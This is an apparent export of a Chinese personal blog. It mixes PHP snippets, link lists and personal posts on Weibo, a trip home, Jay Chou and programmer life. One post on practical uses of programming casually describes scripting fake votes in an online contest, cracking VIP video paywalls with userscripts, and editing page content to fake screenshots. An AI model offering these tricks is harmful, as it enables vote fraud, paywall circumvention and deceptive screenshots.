图片加水印123456789101112131415161718192021222324252627282930313233343536373839/* * 图片加水印函数 * $dst_file : 处理完成后保存到此文件路径 * $src_file ：待处理的图片文件路径 * $logo_file：水印的图片文件路径 * $top ：上间距 * $left ：左间距 * $alpha ：透明度(0-100)【特别注意：若logo_file本身已有透明效果，请务必传false】 */public static function fullFillLogos($dst_file, $src_file, $logo_file, $top=0, $left=0, $alpha=false) &#123; try &#123; //创建图片的实例 $dst = imagecreatefromstring(file_get_contents($src_file)); $logo = imagecreatefromstring(file_get_contents($logo_file)); //获取宽高 list($logo_w, $logo_h) = getimagesize($logo_file); list($dst_w, $dst_h) = getimagesize($src_file); //循环铺上水印 for($off_y=$top; $off_y+$top&lt;$dst_h; $off_y+=$logo_h+$top) &#123; for($off_x=$left; $off_x+$left&lt;$dst_w; $off_x+=$logo_w+$left) &#123; $width = ($off_x+$logo_w+$left&gt;$dst_w) ? ($dst_w-$off_x-$left) : $logo_w; $height = ($off_y+$logo_h+$top&gt;$dst_h) ? ($dst_h-$off_y-$top) : $logo_h; if($alpha === false) &#123; imagecopy($dst, $logo, $off_x, $off_y, 0, 0, $width, $height); &#125; else &#123; imagecopymerge($dst, $logo, $off_x, $off_y, 0, 0, $width, $height, $alpha); &#125; &#125; &#125; //水印完成, 存档... header('Content-Type: image/jpeg'); imagejpeg($dst, $dst_file); imagedestroy($dst); imagedestroy($logo); &#125; catch (Exception $e) &#123; return false; &#125; return true;&#125;http://yyeer.com/%E7%BC%96%E7%A8%8B/2017/12/08/%E4%BD%BF%E7%94%A8GD%E5%BA%93%E7%BB%99%E5%9B%BE%E7%89%87%E9%93%BA%E6%BB%A1%E6%B0%B4%E5%8D%B0/ 素数while循环的分析1234567891011121314151617181920212223242526272829function isprime($num) &#123; $count = (int) sqrt($num); while ($count &gt; 1) &#123; if ($num % $count == 0) &#123; return false; &#125; $count-- ; &#125; return true;&#125;function isprime($num) &#123; $count = (int) sqrt($num); $i = 2; while ($i &lt;= $count) &#123; if ($num % $i == 0) &#123; return false; &#125; $i++ ; &#125;&#125;$start = microtime(true);for ($i = 2; $i &lt; 100000; $i++) &#123; isprime($i);&#125;echo (microtime(true) - $start) * 1000 ."\n";http://blog.qicunshang.com/2018/02/09/%E4%B8%80%E6%AC%A1%E5%85%B3%E4%BA%8E%E7%B4%A0%E6%95%B0while%E5%BE%AA%E7%8E%AF%E7%9A%84%E5%88%86%E6%9E%90/ 繁体简体互转 OpenCC-PHP 扩展 超大文件上传 AetherUpload 视频上传过程 高德地图 SDK https://github.com/Hanson/gaode-sdk 云爬虫 Laravel 插件 PhpSpreadSheet 使用总结 https://phpspreadsheet.readthedocs.io/en/latest/topics/autofilters/ https://learnku.com/articles/29608https://learnku.com/articles/30048 PHP 速查表 https://free-andy.github.io/php-dict https://github.com/free-andy/php-dict plaidCTF两道web题目writeup http://blog.wonderkun.cc/2019/04/15/plaidCTF%E4%B8%A4%E9%81%93web%E9%A2%98%E7%9B%AEwriteup/ ctf https://www.yof3ng.xyz/ PHP中的危险函数和伪协议https://anemone.top/php-PHP%E4%B8%AD%E7%9A%84%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0%E5%92%8C%E4%BC%AA%E5%8D%8F%E8%AE%AE/ 几个比较有意思的逻辑问题 https://www.xuejiayuan.net/blog/1d15a4dfae8747a3b263052ec024aae2 Laravel-sms 阿里云短信扩展包 91porn爬虫php版本 快速、简洁且强大的PHP爬虫框架 CentOS7 轻松部署 Laravel 应用 高性能优化 PHP-FPM 开发自己的composer包 高性能优化 PHP-FPM 大文件传输解决方案：分片上传 / 下载限速 开源访问控制框架 权限控制库 Casbin 数据结构之链表 深入理解计算机系统学习 laragon 简单好用的 PHP 环境 搭建高性能的私有 Composer 镜像服务 PHP socket 的简单理解 phpstudy apache 配置 https 证书 PHP 三年模拟五年面试之一网打尽系列（4）—– MySQL 高级 PHP 中四大经典排序算法 Laravel-snappy 生成 PDF 踩坑记录 Laravel Ignition 错误页面功能全解析 PHP 7.4在线运行代码 PC 端微信扫码支付全过程 PHP 高性能 Excel 扩展 crontab 定时任务直观地编辑 接入 paypal PHP-sdk 支付宝支付 / 回调 / 退款全流程]]></content>
  </entry>
  <entry>
    <title><![CDATA[微博十年了，你还玩吗?]]></title>
    <url>%2F2019%2F09%2F03%2F%E5%BE%AE%E5%8D%9A%E5%8D%81%E5%B9%B4%E4%BA%86%EF%BC%8C%E4%BD%A0%E8%BF%98%E7%8E%A9%E5%90%97%2F</url>
    <content type="text"><![CDATA[微博09年诞生，一晃10年过去了，记得我第一条微博是2012年4月23 https://weibo.com/2717930601/yfTTlFGr8 7年时间微博发了8万多条，我也是佩服自己。 这周（8月28号）微博举行十周年活动，微博小秘书创建了微博十年的话题。https://weibo.com/aj/static/tenyears.html 微博转发300多万。 玩微博这么久，挺后悔的一件事就是没有好好运营，没有成为某方面的大v，粉丝目前还没破万。 下面是我在公司拍的一些照片。 还拍了个微博视频，地址https://weibo.com/2717930601/I4kyJE8E4 https://weibo.com/1642909335/I4gCrzR72 还上了个假的热搜。 媒体总结的近十年的35部爆款剧，你看过多少？ 下面的图片来自微博 https://weibo.com/6046360157/I4ilE6GL3 https://weibo.com/3031969212/I4iFCwLMM https://weibo.com/1385892075/I4jsF6AYU 苹果我还没领。。。 最后祝福微博，下个十年更精彩。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[知识星球精华]]></title>
    <url>%2F2019%2F09%2F02%2F%E7%9F%A5%E8%AF%86%E6%98%9F%E7%90%83%E7%B2%BE%E5%8D%8E%2F</url>
    <content type="text"><![CDATA[知识星球黑客漏洞挖掘”灰袍技能” 2017 精华 爬取知识星球，并制作 PDF 电子书]]></content>
  </entry>
  <entry>
    <title><![CDATA[2017国庆回家之旅]]></title>
    <url>%2F2019%2F08%2F28%2F2017%E5%9B%BD%E5%BA%86%E5%9B%9E%E5%AE%B6%E4%B9%8B%E6%97%85%2F</url>
    <content type="text"><![CDATA[今天一上班就收到同事送的喜糖，还是 2 个，祝福他们。 国庆中秋 8 天假就过去了，坐着熟悉的 z133，经过艰难的 14 个小时，昨天下午一点到北京，一下火车就下雨，天气也凉了许多，北京西站那叫一个人多。地铁都进不去，排着长长的队，还要安检，马上要 19 大了，到处是警察。 这次回家好好的休息了几天，家里这会的天气真好，又在小县城逛了逛，车水马龙的，感觉家里生活也挺好的。真的别再拦我了！我要去吉安县了 爸妈，姐姐，妹妹都在家，还有 5 个外甥，都是男孩子，好调皮，姐姐家的两个跟他大伯去了北京旅游，正好赶上我回家了，不然也可以带他们转转，说实在的，他大伯对大外甥那叫一个好，每年暑假都带去南昌玩，各种好吃好玩的，记得我第一次到南昌去他那玩，还是 06 年刚上大学那会，一晃十年了，那时姐姐刚结婚。前年姐姐在敦厚买房，姐夫他哥哥就拿出 30 万帮他们买了，现在姐姐和姐夫在开发区附近开了个餐馆，妈妈也常去帮忙，餐馆不大，但生意不错，因为附近是工业区，不少公司和厂房，客流不少，开了有 2 年，去年赚了 20 万，今年应该可以到 30 万，在小县城算不错的了，就是比较辛苦，我去那帮忙了一天，光打盒饭就累死我了，还有洗菜，切菜，收拾桌子，中午要忙到 2 点才吃饭，晚上要到 11 点，也是不容易。 2014 年买了现在的房子（价格 3800,106 平米），自去年国庆装修好搬过来以后都在这边住着，小区位置还好，楼下还有幼儿园，小外甥就在那，晚上就睡在家里，也方便，想起我上小学那会（都没有幼儿园），每天走好远的路，自己带盒饭去学校吃，现在的小孩真幸福。听爸妈说小区的房子都卖完了，还涨价了，都 5000 了，看到一个公众号关于吉安的房价吉安9月份最新房价出炉，都在涨价，为什么房子到处都在涨价，小地方工资水平明显没那么高。 给家里拍了个视频，详见http://weibo.com/2717930601/FppR70GcE 关于移动支付，现在小县城都可以不用带零钱出门了，这次回家我还取了 1000 现金准备用，结果一分没花，现在想在路边捡钱比较难了。超市，饭馆，路边摊各种消费，微信/支付宝都可以满足，不过明显使用微信的更多，如今微信已成国民应用，爸妈也都用上微信了，交流起来方便多了，在这里推荐一个微信小程序《微信使用小助手》，有详细的视频讲解如何使用微信。 这次回家又是各种催婚，我也理解，也快 30 ，不小了，大外甥都 10 岁了，时间过得可真快，高中同学里也就剩下没几个还单着的，我现在都不好意思在微信群里说话，好多同学的孩子都上幼儿园了，大学同学也差不多。其实家里条件还好，算不上大富大贵，房子有了，结婚用的被子，床，要花的钱都备好了，老家还在征地，原来用来种水稻的地都准备用来建开发区，已经征了一部分，到时候钱是按人头分，每个人至少 10 几万吧，于是好多人赶着结婚，生小孩，多个人就多份钱，也是服气。 这次回家还见了个高中好友，记得当时和他同桌，每天一起上课，吃饭，睡觉，上大学的时候来南昌找过我玩，这一晃就 8 年了，他现在老家一个派出所，大学毕业后考的公务员，一辆别克车，房子在吉安市，儿子刚出生不久，成家立业，简直人生赢家，老婆孩子热炕头，令人羡慕。 今天在掘金上看到这篇文章https://juejin.im/entry/59dae591f265da064844865f ，关于北漂的经历，感同身受，最近已经不少前同事离开北京了，记得 5 年前来北京的时候想着要在这里扎根，然而现实是残酷的，北京如同铁打的银盘，一批又一批的年轻人如同流水的兵，所以北京才显得年轻。我们这些北漂，何处是归途，我也想过要离开北京，年初就想了，是时候准备走了。 最后附几张图片 跟老同学在 KTV，好久没唱歌，开心。 小县城电影院看开心麻花的《羞羞的铁拳》 陪爸妈看电视剧《我的三妈两爸》，关于知青的，拍得挺感人，片尾曲《木兰开》挺好听。http://weibo.com/5863878501/FnqP1rUKp 小区的女神像 小外甥上学的幼儿园 小县城晚上最热闹的龙湖广场http://weibo.com/2717930601/FoQR010w8 自己做的菜 牛肉炒辣椒http://weibo.com/2717930601/FpqJRk8eM 姐姐的餐馆打包外卖http://weibo.com/2717930601/Fp653BYAF? ps：朋友圈看到的一篇《山东男孩过节回乡指南》http://weibo.com/ttarticle/p/show?id=2309404158123681178037]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[周杰伦《十一月的萧邦》]]></title>
    <url>%2F2019%2F08%2F28%2F%E5%91%A8%E6%9D%B0%E4%BC%A6%E3%80%8A%E5%8D%81%E4%B8%80%E6%9C%88%E7%9A%84%E8%90%A7%E9%82%A6%E3%80%8B%2F</url>
    <content type="text"><![CDATA[我个人是比较喜欢听歌的，有时候走在路上听到一首好歌，立马打开微信摇一摇识别记录下来，所以每天上班都要打开网易云音乐。 之前也写过一篇关于杰伦的 周杰伦出道16年精选 微博上关注不少音乐博主，比如@我所爱的港乐 @私人音乐厅 看到喜欢的歌就下载收藏，那天逛微博偶然看见《2005年10月KKBOX华语单曲月榜Top50》这条视频，top 10 里有 8 首来自周杰伦 2015年 11 月发行的《十一月的萧邦》，听着那动听的旋律，不禁回忆起 12 年前的青春时光。 https://v.qq.com/txp/iframe/player.html?origin=https%3A%2F%2Fmp.weixin.qq.com&amp;vid=v0539v6tfd5&amp;autoplay=false&amp;full=true&amp;show1080p=false&amp;isDebugIframe=false电影《头文字D》插曲《一路向北》，这首歌还是很朗朗上口的。 这张专辑里我唯一能唱完整的歌《枫》 东方古典气质《发如雪》 为你弹奏萧邦的夜曲 2000 - 2010 的 10 年整个华语乐坛也几乎是周杰伦的华语乐坛，拿过无数大奖，从 2000 年 第一张专辑《jay》出道至今，几乎每年一张专辑，那时候每年夏天都期待他的新专辑问世。 以上介绍来自网易云音乐 http://music.163.com/#/artist/desc?id=6452 杰伦在网易的这首评论高达百万的《晴天》http://music.163.com/#/song?id=186016，评论区有无数人的青春和故事，每天还有人留言。 记得第一次听那首《龙卷风》就喜欢上了，原来歌还能这样唱，完全不同于以往的 王菲，谭咏麟。然后开始跟着学唱，之后的每张专辑都买，还有那时候流行的大头贴，然后抄歌词，听单放机，那个时候的我简直是疯狂的 jay 迷。 《七里香》出来的时候，教室里整个夏天都在放播放这首歌，记得我的同桌也非常喜欢这首歌，所以那时候上自习我们经常一人戴一个耳机听着，后来我还给她写了封情书，那是我写的第一封情书，也是最后一封，可惜我们没有后来。去年在微信上跟她提这个，她还说我们没缘分，因为那时候快高考了，然后毕业后各奔东西。 其实不光喜欢歌里的词，每首歌的 mv 都是那么有故事性的，如展现家庭暴力的的《爸，我回来了》父子情的《以父之名》反战的《止战之殇》，在那个没有互联网的时代，我经常在家里看他的 mv，可惜那些 cd 现在都找不到了。 想想许久未去 KTV 了，年初的时候和朋友去 KTV 唱了一下午，她也是 jay 迷，唱得比我好听多了，而且会唱粤语，其实我也喜欢 beyond，王菲，郑秀文，杨千嬅的粤语歌，但那个调唱不来，只能哼唱着，那个下午我们唱的酣畅淋漓。 至今还保存着杰伦 2004 无与伦比 演唱会的视频，简直帅炸了，那是周杰伦的巅峰时刻。至今还没去看一场周杰伦的演唱会，实乃一大遗憾！ https://v.qq.com/txp/iframe/player.html?origin=https%3A%2F%2Fmp.weixin.qq.com&amp;vid=w0193yhh9ab&amp;autoplay=false&amp;full=true&amp;show1080p=false&amp;isDebugIframe=false 最后说说这部周杰伦自导自演的电影《不能说的秘密》，2007 年上映，过去整整 10 年了，这是周杰伦一开始就拍了一部自己难以超越的经典之作。今年《大话西游》都重新上映了，如果这部电影再次上映，一定要去看。 最后来几张杰伦壁纸 那时候闻着七里香，喝着爷爷泡的茶，看着最长的电影，安静的听着夜曲，心搁浅在回忆里，明明就很爱你，却开不了口，多希望盼来晴天。你说想听稻香，想回到过去，不是人人都能走出红尘客栈，就算你一路向北也是看不见彩虹的。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[会点编程有什么用呢？]]></title>
    <url>%2F2019%2F08%2F28%2F%E4%BC%9A%E7%82%B9%E7%BC%96%E7%A8%8B%E6%9C%89%E4%BB%80%E4%B9%88%E7%94%A8%E5%91%A2%EF%BC%9F%2F</url>
    <content type="text"><![CDATA[从事编程行业几年来，越来越感觉到编程带来的便利，今天就来说说编程，哪怕你不从事 it ，会点简单的编程，也能让你的工作，生活更加便利。 0.编程让我实现我自小的一个梦想，就是每天玩电脑 你还记得你第一次玩电脑的场景吗？记得我第一次玩电脑是高中的微机课，那还是 windows 98 的年代，原来电脑长这样的，于是开始练习打字，那时候流行五笔，我还背过，什么王旁青头兼五一，不过现在都用智能的搜狗拼音了，早忘了五笔输入法了，如果你看见一个人还会五笔，那起码网龄有 10 年，我还真认识个朋友现在还用五笔。 那时候练习打字也能玩得不亦乐乎，还有不需要联网的棋牌游戏，后来第一次去网吧，申请了第一个 QQ ，一直用到现在，原来上网这么好玩，要是每天能玩电脑就好了，现在都实现了，每天上班下班都对着电脑，而且还带发工资的，哈哈。 1.刷票 之前喜欢听喜马拉雅上一个主播的节目，然后加了微信，她参加考拉 Fm 的一个主播争霸赛，需要投票 网址是这个 http://m.kaolafm.com/event/meizu/，然后打开控制台看看投票请求，很简单的一个 post ，用 Python 模拟请求，多进程开始刷票，后来刷到第二还感谢我来着，因为第一也是刷的，真是尴尬。 2.下载喜马拉雅节目 平常比较喜欢听喜马拉雅，上班的时候也听，但有时候节目可能播放不了，或者被下架了，所以如果喜欢的话最好下载到本地，这个也很简单了，打开控制台，看看请求就可以了，这里简单说说，之前也写过一篇，有兴趣可以回看下。python下载喜马拉雅音频节目 打开 叶蓝怀旧经典 专辑页面http://www.ximalaya.com/1013246/album/232404?feed=reset 点击播放 叶蓝怀旧经典（年代2 B）这个链接 http://www.ximalaya.com/1013246/sound/49214484/ 的时候可以看到请求 http://www.ximalaya.com/tracks/49214484.json 这个地址来获取音频的播放地址，打开本地 PHP 或者 demo.php.cn 执行如下代码就可以得到播放地址，而且提供了 3 个播放地址。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081821. `&gt;&gt;&gt; json_decode(file_get_contents('http://www.ximalaya.com/tracks/49214484.json'`2. `),1)`3. `=&gt; [`4. `"id" =&gt; 49214484,`5. `"play_path_64" =&gt; "http://audio.xmcdn.com/group33/M02/F1/A7/wKgJnVmn6a-gNGZ`6. `VALEkfCY6bs0406.m4a",`7. `"play_path_32" =&gt; "http://audio.xmcdn.com/group30/M0A/53/85/wKgJXlmn-f3jr-3`8. `8AEO7-5PcePo457.m4a",`9. `"play_path" =&gt; "http://audio.xmcdn.com/group33/M02/F1/A7/wKgJnVmn6a-gNGZVAL`10. `EkfCY6bs0406.m4a",`11. `"duration" =&gt; 1433,`12. `"title" =&gt; "鍙惰摑鎬€鏃х粡鍏革紙骞翠唬2 B锛?,`13. `"nickname" =&gt; "鍙惰摑",`14. `"uid" =&gt; 1013246,`15. `"waveform" =&gt; "group33/M02/F1/A6/wKgJnVmn6aah81DRAAAKyXWE1yM1490.js",`16. `"upload_id" =&gt; "u_50653084",`17. `"cover_url" =&gt; "http://fdfs.xmcdn.com/group32/M0B/F1/2F/wKgJnFmn6WDiUz5cAAE`18. `T05qFZbc613.jpg",`19. `"cover_url_142" =&gt; "http://fdfs.xmcdn.com/group32/M0B/F1/2F/wKgJnFmn6WDiUz5`20. `cAAET05qFZbc613_web_large.jpg",`21. `"formatted_created_at" =&gt; "8鏈?1鏃?18:49",`22. `"is_favorited" =&gt; false,`23. `"play_count" =&gt; 6894,`24. `"comments_count" =&gt; 2,`25. `"shares_count" =&gt; 0,`26. `"favorites_count" =&gt; 18,`27. `"album_id" =&gt; 232404,`28. `"album_title" =&gt; "鍙惰摑鎬€鏃х粡鍏?,`29. `"intro" =&gt; null,`30. `"have_more_intro" =&gt; false,`31. `"time_until_now" =&gt; "2澶╁墠",`32. `"category_name" =&gt; "music",`33. `"category_title" =&gt; "闊充箰",`34. `"played_secs" =&gt; null,`35. `"is_paid" =&gt; false,`36. `"is_free" =&gt; null,`37. `"price" =&gt; null,`38. `"discounted_price" =&gt; null,`39. `]`40. `#这里的中文乱码是因为控制台的问题`41. `play_path_64 play_path_32 play_path 这就是播放地址了` 查看源码可以看到专辑的所有节目 id 1234561. `&lt;div class="personal_body" sound_ids="49214484,49214288,48891988,48681674,48582490,48464067,48234597,48121378,48121332,47762645,47642366,47286524,46736251,46623824,46511315,46406422,46072065,45992952,45878086,45273159,45034069,44811998,44472153,44471916,44364049,44363462,43854577,43847936,42253074,42252868,41924408,41663301,41662740,41658707,41658092,41522195,41426556,40239246,39009728,38352847,38352724,38352477,38351638,38351333,38351008,36580963,36580917,36218178,36218007,35295950,35295661,35295333,35295214,33501202,33093325,33092262,33092063,33091981,32764398,32764160,32763717,32110713,32110678,31047841,31047773,30966547,29435400,29434978,29434949,28169860,28169766,28169025,27175492,27175230,27056653,26944034,26760530,26641935,25945768,25834471,25590501,25590468,25452949,25149470,24962920,24803524,24679984,24557571,24374731,24177939,24066359,23961591,23829627,23643939,23268727,22913093,22786524,22621074,22404004,22285985"&gt;`2. `&lt;div class="detailContent" sound_id="49214484"&gt;`4. `替换 http://www.ximalaya.com/tracks/49214484.json 这个地址的 id 就可以获取所有播放地址下载到本地` ps: 这个方法同样用于一些视频网站，比如 1024 爱情动作片网站，想下载苍老师的视频，得到请求地址就可以下载，具体就不说了，你懂的。 3.下载电影/音乐 平常在 b 站，微博看到很好的电影视频，虽然收藏了，但是说不定哪天被删了，所以还是下载到电脑比较好，于是有了 you-get ，当然还有些其他下载工具，之前我写过一篇下载电影/视频神器 ,比如星爷的《逃学威龙3》,才 301 MB，果断下载收藏，还有网易云音乐这篇批量下载网易云音乐 123456789101112131415161718192021222324252627281. `$ you-get -i https://www.bilibili.com/video/av13948415/`2. `site: Bilibili`3. `title: 【喜剧/校园】逃学威龙3之龙过鸡年[国语版] 1993 周星驰 /`4. `梅艳芳 / 张敏 / 陈百祥`5. `streams: # Available quality and codecs`6. `[ DEFAULT ] _________________________________`7. `- format: flv`8. `container: flv`9. `size: 743.5 MiB (779605973 bytes)`10. `# download-with: you-get --format=flv [URL]`12. `- format: mp4`13. `container: mp4`14. `size: 301.9 MiB (316573330 bytes)`15. `# download-with: you-get --format=mp4 [URL]` 4.反钓鱼 看看这篇文章《你的QQ号是这么被偷走的！》https://zhuanlan.zhihu.com/p/28805998 一个很简单的网页来盗取你的 QQ号，界面和 QQ 一模一样，我们都知道要先看看域名，但是如果是手机上不方便看，或者不懂电脑的人也不知道什么域名，傻傻的输入自己的 QQ 号和密码，我还记得十年前这种 Q币 中奖也类似。 还有类似的 https://zhuanlan.zhihu.com/p/27590807 https://zhuanlan.zhihu.com/p/28810019 ps： 找工作先看看对方公司信息，可以通过 Whois查询 反查询 http://whois.chinaz.com/ 和天眼查 https://www.tianyancha.com/company/2841267 了解对方公司，防止被骗， 所以短信或微信里的不认识的链接，千万别打开，尤其使用 dwz.cn t.cn 短网址的链接，因为它不是真实地址，只是一个跳转。 5.命令行 有句话这样说的，百度用来检测网络是否正常，谷歌用来检测墙是否正常，不过打开浏览器慢，直接命令行 ping 下就知道网络正常与否了。 1234567891011121314151617181920212223242526272829303132333435361. `$ ping baidu.com`3. `正在 Ping baidu.com [220.181.57.217] 具有 32 字节的数据:`4. `来自 220.181.57.217 的回复: 字节=32 时间=4ms TTL=56`5. `来自 220.181.57.217 的回复: 字节=32 时间=6ms TTL=56`6. `来自 220.181.57.217 的回复: 字节=32 时间=4ms TTL=56`7. `来自 220.181.57.217 的回复: 字节=32 时间=26ms TTL=56`9. `220.181.57.217 的 Ping 统计信息:`10. `数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，`11. `往返行程的估计时间(以毫秒为单位):`12. `最短 = 4ms，最长 = 26ms，平均 = 10ms`13. `$ ping google.com`15. `正在 Ping google.com [216.58.200.46] 具有 32 字节的数据:`16. `请求超时。`17. `请求超时。`18. `请求超时。`19. `请求超时。`21. `216.58.200.46 的 Ping 统计信息:`22. `数据包: 已发送 = 4，已接收 = 0，丢失 = 4 (100% 丢失)，` 查看本地 ip 也简单 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849501. `$ ipconfig`3. `Windows IP 配置`6. `以太网适配器 VirtualBox Host-Only Network:`8. `连接特定的 DNS 后缀 . . . . . . . :`9. `本地链接 IPv6 地址. . . . . . . . : fe80::e4d6:94c7:1eaf:477a%46`10. `自动配置 IPv4 地址 . . . . . . . : 169.254.71.122`11. `子网掩码 . . . . . . . . . . . . : 255.255.0.0`12. `默认网关. . . . . . . . . . . . . :`14. `以太网适配器 本地连接 4:`16. `媒体状态 . . . . . . . . . . . . : 媒体已断开`17. `连接特定的 DNS 后缀 . . . . . . . :`19. `以太网适配器 本地连接 3:`21. `媒体状态 . . . . . . . . . . . . : 媒体已断开`22. `连接特定的 DNS 后缀 . . . . . . . :`24. `以太网适配器 本地连接:`26. `媒体状态 . . . . . . . . . . . . : 媒体已断开`27. `连接特定的 DNS 后缀 . . . . . . . :`29. `无线局域网适配器 无线网络连接:`31. `连接特定的 DNS 后缀 . . . . . . . :`32. `本地链接 IPv6 地址. . . . . . . . : fe80::4101:9ca0:f37c:4d11%13`33. `IPv4 地址 . . . . . . . . . . . . : 192.168.1.103`34. `子网掩码 . . . . . . . . . . . . : 255.255.255.0`35. `默认网关. . . . . . . . . . . . . : 192.168.1.1`36. `&gt;&gt;&gt; gethostbyname('')`37. `=&gt; "192.168.1.103"` 查看外网 ip 1234567891011121314151617181. `$ curl ipinfo.io`2. `&#123;`3. `"ip": "3.102.20.106",`4. `"city": "beijing",`5. `"region": "beijing",`6. `"country": "CN",`7. `"loc": "30.29,120.14",`8. `"org": "AS4134 CHINANET-BACKBONE"`9. `&#125;` 6.学会更快的搜索到你想要的 网络上资源太多了，如何能最快找到你想要的呢，这就需要一些搜索技巧了，之前也写过一篇，有兴趣可以回看。那些你不知道的搜索技巧 7.玩微信机器人 微信是目前最流行的聊天工具了，于是出现不少的微信机器人，基于 PHP Python go 的语言都有，可以用个人微信也可以基于公众号，之前我也写过两篇我的微信公众号机器人 WeChat robot 8.免费看视频网站 vip 视频 想看最近的电影，但是需要 vip ，又不想花钱，好了，下载这个油猴子 http://tampermonkey.net/ https://greasyfork.org/zh-CN/scripts 上面有很多脚本分享，选择 破解VIP会员视频集合 安装就可以看 vip 视频了。 9.网页截图不一定是真的 打开控制台，就可以随意修改网页了，所以别人给你的网页截图不一定是真的。而且一些微信聊天截图也有生成工具,更不用说强大的 ps 了。 比如现在自媒体很火，一些十几万粉丝的大号推一篇广告价格就上万，粉丝数是个很大的衡量指标，打开控制台，输入 document.body.contentEditable = true 我的公众号粉丝数也可以改成 10 万，之前也写过一篇手把手教你用javascript黑掉百度 还有支付宝余额也可以随意修改. 其实还有很多会编程或工具带来的便利，今天就分享这些，周末愉快。]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[程序员是个什么物种]]></title>
    <url>%2F2019%2F08%2F28%2F%E7%A8%8B%E5%BA%8F%E5%91%98%E6%98%AF%E4%B8%AA%E4%BB%80%E4%B9%88%E7%89%A9%E7%A7%8D%2F</url>
    <content type="text"><![CDATA[先说个前几天看到一条打脸的微博，真令人喷饭，哈哈。 原博内容http://weibo.com/1736574887/FrluW2ten： 莫言：我敬佩两种人： 年轻时， 陪男人过苦日子的女人。 富裕时 陪女人过好日子的男人。 我远离两种人： 遇到好事就伸手的人； 碰到难处就躲闪的人。 我掛念两种人： 相濡以沫的爱人； 肝胆相照的朋友。 我谢绝两种人： 做事不道义的人； 处事无诚意的人。 我负责两种人： 生我的人； 我生的人。 我珍惜两种人： 肯开口规劝我的人， 会真心牵挂我的人！ 然后莫言转发内容：理不糙，可我也想知道这是谁写的。 所以好多微博公众号上的什么马云说等，都是借势营销，这让我想起这个表情包。 帝都的天气越来越冷了，这两天刮风呼呼作响，这个时候能和你出去的都是生死之交。 先来副对联（源自电影《唐伯虎点秋香》）： 上联：一个项目两台电脑三餐盒饭只为四千工资搞得五脏俱伤六神无主仍然七点起床八点开会处理九个 BUG 十分辛苦。 下联：十年编程九年加班八面无光忙得七窍生烟到头六亲不认五体投地依旧四处奔波三更半夜只为两个臭钱一生孤苦。 横批：IT人生 再来听两首歌 程序员 http://music.163.com/#/song/34376178 产品经理是条狗 http://music.163.com/#/song?id=28798601 脉脉上关于程序员的话术接龙，只有接触过程序员的同学才能看懂。 https://maimai.cn/web/gossip_detail?src=app&amp;webid=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1Ijo1ODQxMSwiaWQiOjk2MTI3NTV9.RYgO0h4LB2UGrJVViukBuj0aQ607BfWLmm-FnIOVdCk 这周二 10.24 正好是程序员节，也不知道什么时候开始这都成一个节日了。以下来自百科的介绍： 1024是2的十次方，二进制计数的基本计量单位之一。程序员(英文Programmer)是从事程序开发、维护的专业人员。程序员就像是一个个1024，以最低调、踏实、核心的功能模块搭建起这个科技世界。1G=1024M，而1G与1级谐音，也有一级棒的意思。 这天 infoq 公众号还做了第一次全国程序员人口普查，看投票结果男性明显多于女性，毕竟大学里学工科的男生多于女生。 还有 阿里技术给程序员的 1024 的挑战书 还挺有意思的，之前我用摩斯编码还发过几条朋友圈，有兴趣可以去翻下。 ..-./—-./-…./…–/..-/..-./—-./.—-/-..-/-..-/..-./…../—-./-.–/—-./..-./-…./..—/.—-/.—-/..-./-…./–…/-…./…../..-./….-/…-/—../-…./ 摩斯编码解密F963UF91XXF59Y9F6211F6765F4V86 埃特巴什码（ Atbash Cipher ）是一个系统：最后一个字母代表第一个字母，倒数第二个字母代表第二个字母。 在罗马字母表中，它是这样出现的： 常文：A B C D E F G H I J K L M N O P Q R S T U V W X Y Z 密文：Z Y X W V U T S R Q P O N M L K J I H G F E D C B A U963F U91CC U59B9 U6211 U6765 U4E86 这是 Unicode 解码后就是 ： 阿 里 妹 我 来 了 微博上还有个视频 有一个做程序员的对象是什么体验http://weibo.com/5497993620/Fri3cDgmh 还有http://weibo.com/2692008324/FrrcVCW4T 21世纪的清教徒，程序员，你们辛苦了！ http://weibo.com/3764674343/FqW7V9gil 看来如今程序员这个群体也算得到一种认可了。 看完以上，也许你对程序员有一定的认识了，之前写过一篇会点编程有什么用呢？，作为一个工作过几年的现程序员，说说一天的工作： 早上 8 点前起，赶在 8 点半前上班，每天这个时候的地铁很挤人，尤其最近 大会，安检非常严格，排队很慢，结果周一就迟到了。 到公司 10 点，打开邮箱，看看最新未处理邮件，因为办公事项主要通过邮箱沟通，当然还有 QQ 群。 看会 QQ 群，微信群到 10 点半了 开始工作，编辑器，命令行什么的都开好了，因为电脑只有周一才开一次，周五关机。有时候开个产品会，和产品对下项目进度，留下的问题，bug 还有多少没改，大概要多久完成，11 点左右真正开始工作了，戴上耳机，打开网易云音乐，进入状态，不一会到 11 点 40 ，准备出去吃午饭了，要知道中午人多，所以早点去楼下点好餐，吃完到公司附近园区逛了逛，1 点午睡，到 2 点开始下午的工作，中间偶尔刷会微博，看看朋友圈，到下午 6 点半出去吃晚饭了，吃到7 点左右，又逛下，7 点半下班回家，当然如果项目紧张没完成那就就要加班了，上周就加班好几次，到10 点才打车回去。如果碰到上线日期，晚上 11 点开始推送代码，然后回归测试，如果顺利的话 12 点完成，如果更新一个大版本，经常弄到 2 点，已经遇到好几次了。 所以程序员每天的工作是枯燥乏味的，跟 26 个字母打交道的时间同人还要多，每天重复着写代码，改 bug，对需求。 说完工作，说工资，最近公众号 西二旗指北 一篇传播很广的文章月入五万的西二旗人教你如何活得像月薪五千 ，看完后感觉自己是个假的程序员，因为别说 5 万，3 万还没有达到，真是拖后腿了，不过根据博主 路人甲的分析，不说月入过5 万，3万的也是凤毛麟角，所以这些号只是为了营销，收获一篇又一篇的10 万+，广告价格又可以提升了。 当然 5 万肯定是有的，比如大公司的高管或创业公司的合伙人 cto，我查了下百度在拉钩上的研发招聘，平均基本在 2 万 5 左右。 然后看了下我们公司的招聘，基本在 1万5 